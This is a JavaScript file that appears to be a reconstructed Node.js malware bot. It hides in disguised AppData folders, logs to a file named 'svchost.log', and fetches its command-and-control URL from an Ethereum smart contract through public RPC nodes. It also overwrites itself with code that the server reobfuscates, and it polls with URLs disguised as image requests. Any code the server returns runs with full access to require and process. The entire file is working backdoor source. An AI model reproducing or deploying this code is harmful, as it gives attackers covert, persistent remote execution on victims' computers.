(() => {
  // Module registry (webpack-like)
  const modules = {
    "./work_7da7e3b4-c81e-427b-9ac3-fc35bf28e319_7xsY0uo9/wp_src sync recursive"(module) {
      // Fake require.context (empty)
      function requireContext() {
        const err = new Error("Cannot find module");
        err.code = "MODULE_NOT_FOUND";
        throw err;
      }
      requireContext.keys = () => [];
      requireContext.resolve = requireContext;
      requireContext.id = "./work_...";
      module.exports = requireContext;
    },
    crypto(module) { module.exports = require("crypto"); },
    fs(module) { module.exports = require("fs"); },
    os(module) { module.exports = require("os"); },
    path(module) { module.exports = require("path"); }
  };

  const cache = {};

  function require(id) {
    if (cache[id]) return cache[id].exports;
    const module = cache[id] = { exports: {} };
    modules[id](module, module.exports, require);
    return module.exports;
  }

  // Add .o helper (hasOwnProperty)
  require.o = (obj, prop) => Object.prototype.hasOwnProperty.call(obj, prop);

  (async () => {
    // ==================== CONFIG ====================
    const FALLBACK_SERVER = "http://localhost:3000";
    const BUILD_ID = "7da7e3b4-c81e-427b-9ac3-fc35bf28e319";
    const CONTRACT_ADDRESS = "0xc7a92c95e3aadd4f8434bf094af7368aaa882396";
    const DATA_SLOT = "0xbd4d52f20c89b5e403046d6cee21755fd21ef25a";   // storage slot used for eth_call
    const ENABLE_BLOCKCHAIN_LOOKUP = true;
    const LOGGING_ENABLED_DEFAULT = false;

    const RPC_LIST = [
      "https://eth.llamarpc.com",
      "https://mainnet.gateway.tenderly.co",
      "https://rpc.flashbots.net/fast",
      "https://rpc.mevblocker.io",
      "https://eth-mainnet.public.blastapi.io",
      "https://ethereum-rpc.publicnode.com",
      "https://rpc.payload.de",
      "https://eth.drpc.org",
      "https://eth.merkle.io"
    ];

    const fs = require("fs");
    const path = require("path");
    const crypto = require("crypto");

    let serverUrl = FALLBACK_SERVER;
    let loggingEnabled = LOGGING_ENABLED_DEFAULT;

    // ==================== PERSISTENCE HELPERS ====================
    const getInstallDir = () => {
      const localAppData = process.env.LOCALAPPDATA || 
                           path.join(process.env.USERPROFILE || "", "AppData", "Local");

      const folders1 = ["Microsoft", "Windows", "Programs", "Packages", "Google"];
      const folders2 = ["Services", "Components", "Assemblies", "Extensions", "Modules"];

      const machineUser = (process.env.COMPUTERNAME || "") + (process.env.USERNAME || "");
      const hash = crypto.createHash("md5").update(machineUser).digest("hex").slice(0, 8);

      const dir1 = folders1[parseInt(hash.slice(0, 2), 16) % folders1.length];
      const dir2 = folders2[parseInt(hash.slice(2, 4), 16) % folders2.length];
      const suffix = hash.slice(4);

      const base = path.join(localAppData, dir1);
      if (fs.existsSync(base)) {
        return path.join(base, dir2, suffix);
      }
      return path.join(localAppData, hash);
    };

    const installDir = getInstallDir();
    const configPath = path.join(installDir, crypto.createHash("md5").update(installDir).digest("hex").slice(0, 6));
    const logFile = path.join(process.env.APPDATA, "svchost.log");

    const log = (msg) => {
      if (!loggingEnabled) return;
      try {
        const timestamp = new Date().toISOString();
        fs.appendFileSync(logFile, `[${timestamp}] ${msg}\n`);
      } catch (e) {
        try { fs.writeFileSync(logFile, `[ERROR] LOG FAILED: ${e.message}\n`); } catch {}
      }
    };

    const loadConfig = () => {
      try {
        if (fs.existsSync(configPath)) {
          const data = fs.readFileSync(configPath, "utf8");
          return JSON.parse(Buffer.from(data, "base64").toString());
        }
      } catch {}
      return null;
    };

    const saveConfig = (cfg) => {
      try {
        fs.mkdirSync(installDir, { recursive: true });
        fs.writeFileSync(configPath, Buffer.from(JSON.stringify(cfg)).toString("base64"));
        log("Config saved");
      } catch {}
    };

    // ==================== BOT ID ====================
    const getBotId = () => {
      let cfg = loadConfig();

      if (cfg && cfg[0]) return cfg[0];

      const appData = process.env.APPDATA || require("os").homedir();
      const idFile = path.join(appData, ".node_bot_id");

      // Try existing .node_bot_id
      try {
        if (fs.existsSync(idFile)) {
          const id = fs.readFileSync(idFile, "utf8").trim();
          if (!cfg) cfg = {};
          cfg[0] = id;
          saveConfig(cfg);
          return id;
        }
      } catch {}

      // Try other hidden files (length 11 starting with .)
      try {
        const hidden = fs.readdirSync(appData)
          .filter(f => f.startsWith(".") && f.length === 11);

        if (hidden.length > 0) {
          const id = fs.readFileSync(path.join(appData, hidden[0]), "utf8").trim();
          if (!cfg) cfg = {};
          cfg[0] = id;
          saveConfig(cfg);
          return id;
        }
      } catch {}

      // Generate new UUID
      const newId = crypto.randomUUID();
      if (!cfg) cfg = {};
      cfg[0] = newId;
      saveConfig(cfg);
      return newId;
    };

    const botId = getBotId();

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    const MAGIC_PREFIX = "0x7d434425";   // probably a signature/magic

    log(`Started | ID: ${botId} | Build: ${BUILD_ID}`);
    log(`Install dir: ${installDir}`);

    // ==================== BLOCKCHAIN URL FETCHING ====================
    const makeCallData = (address) => {
      return MAGIC_PREFIX + address.toLowerCase().replace("0x", "").padStart(64, "0");
    };

    const decodeStringFromCall = (hexResult) => {
      if (!hexResult || hexResult === "0x" || hexResult.length < 130) return null;
      try {
        const data = hexResult.replace("0x", "");
        const offset = parseInt(data.slice(0, 64), 16) * 2;
        const length = parseInt(data.slice(offset, offset + 64), 16);
        const strHex = data.slice(offset + 64, offset + 64 + length * 2);
        return Buffer.from(strHex, "hex").toString("utf8");
      } catch {
        return null;
      }
    };

    const fetchUrlFromBlockchain = async () => {
      const callData = makeCallData(DATA_SLOT);
      const results = {};

      const promises = RPC_LIST.map(async rpc => {
        try {
          const res = await fetch(rpc, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              jsonrpc: "2.0",
              method: "eth_call",
              params: [{ to: CONTRACT_ADDRESS, data: callData }, "latest"],
              id: 1
            }),
            signal: AbortSignal.timeout(10000)
          });

          const json = await res.json();
          if (json.result) {
            const url = decodeStringFromCall(json.result);
            if (url && /^(https?|wss?):\/\//.test(url)) {
              results[rpc] = url.trim();
            }
          }
        } catch {}
      });

      await Promise.allSettled(promises);

      if (Object.keys(results).length === 0) return null;

      // Return most common URL (majority vote)
      const count = {};
      Object.values(results).forEach(url => count[url] = (count[url] || 0) + 1);

      return Object.entries(count)
        .sort((a, b) => b[1] - a[1])[0][0];
    };

    // Try to get C2 URL from Ethereum smart contract
    if (ENABLE_BLOCKCHAIN_LOOKUP) {
      log("Fetching URL from blockchain...");
      const blockchainUrl = await fetchUrlFromBlockchain();
      if (blockchainUrl) {
        serverUrl = blockchainUrl;
        log("Blockchain URL: " + blockchainUrl);
      } else {
        log("Blockchain fetch failed, using fallback");
      }
    }

    log("Server URL: " + serverUrl);

    // ==================== REOBFUSCATION (self-update) ====================
    const attemptReobfuscation = async () => {
      try {
        let cfg = loadConfig();
        if (!cfg || cfg[3]) {
          log("Reobfuscation skipped (already done)");
          return;
        }
        if (!cfg[1]) return;

        const scriptPath = path.join(installDir, cfg[1]);
        if (!fs.existsSync(scriptPath)) return;

        log("Requesting reobfuscation...");

        const code = fs.readFileSync(scriptPath, "utf8");

        const res = await fetch(`${serverUrl}/api/[REOBF_PATH]/${botId}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ code, build: BUILD_ID }),
          signal: AbortSignal.timeout(30000)
        });

        if (!res.ok) {
          log("Reobf failed: " + res.status);
          return;
        }

        const newCode = await res.text();
        if (newCode && newCode.length > 100) {
          fs.writeFileSync(scriptPath, newCode, "utf8");
          cfg[3] = Date.now();
          saveConfig(cfg);
          log("Reobfuscated successfully");
        }
      } catch (e) {
        log("Reobf error: " + e.message);
      }
    };

    await attemptReobfuscation();

    // ==================== MAIN POLLING LOOP ====================
    async function pollForTask() {
      const rand1 = crypto.randomBytes(4).toString("hex");
      const exts = ["png", "jpg", "gif", "css", "ico", "webp"];
      const ext = exts[Math.floor(Math.random() * exts.length)];

      const params = ["id", "token", "key", "b", "q", "s", "v"];
      const param = params[Math.floor(Math.random() * params.length)];

      const rand2 = crypto.randomBytes(4).toString("hex");

      const url = `${serverUrl}/api/${rand1}/${botId}/${rand2}.${ext}?${param}=${BUILD_ID}`;

      try {
        log("Polling: " + url);

        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 120000);

        const res = await fetch(url, {
          signal: controller.signal,
          headers: { "X-Bot-Server": serverUrl }
        });

        clearTimeout(timeout);

        if (!res.ok) {
          log("Poll failed: " + res.status);
          await sleep(5000);
          return;
        }

        const taskCode = await res.text();

        if (taskCode && taskCode.length > 10) {
          log(`Received task (${taskCode.length} bytes)`);

          setImmediate(async () => {
            try {
              // Dynamically create and execute received code with access to require, process, etc.
              const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
              const fn = new AsyncFunction("require", "process", "Buffer", "console", "__dirname", "__filename", "log", taskCode);

              await fn(
                typeof require !== "undefined" ? require : modules["./work_..."],
                process,
                Buffer,
                console,
                __dirname,
                __filename,
                log
              );

              log("Task executed successfully");
            } catch (e) {
              log("Task execution error: " + e.message);
            }
          });
        }
      } catch (e) {
        if (e.name !== "AbortError") {
          log("Connection error: " + e.message);
          await sleep(5000);
        }
      }
    }

    // Periodic blockchain URL refresh + logging toggle
    let lastBlockchainCheck = Date.now();
    setInterval(() => {
      if (ENABLE_BLOCKCHAIN_LOOKUP && Date.now() - lastBlockchainCheck > 300000) {
        log("Refreshing blockchain URL...");
        fetchUrlFromBlockchain().then(newUrl => {
          if (newUrl && newUrl !== serverUrl) {
            serverUrl = newUrl;
            log("New C2 URL from blockchain: " + newUrl);
          }
        }).catch(() => {});
        lastBlockchainCheck = Date.now();
      }

      const cfg = loadConfig();
      if (cfg && typeof cfg[5] === "boolean") {
        loggingEnabled = cfg[5];
      }
    }, 60000);

    log("Main loop started");

    // ==================== INFINITE POLLING LOOP ====================
    while (true) {
      try {
        await pollForTask();
      } catch (e) {
        log("Main loop error: " + e.message);
      }
      await sleep(500);
    }
  })();

  module.exports = {};
})();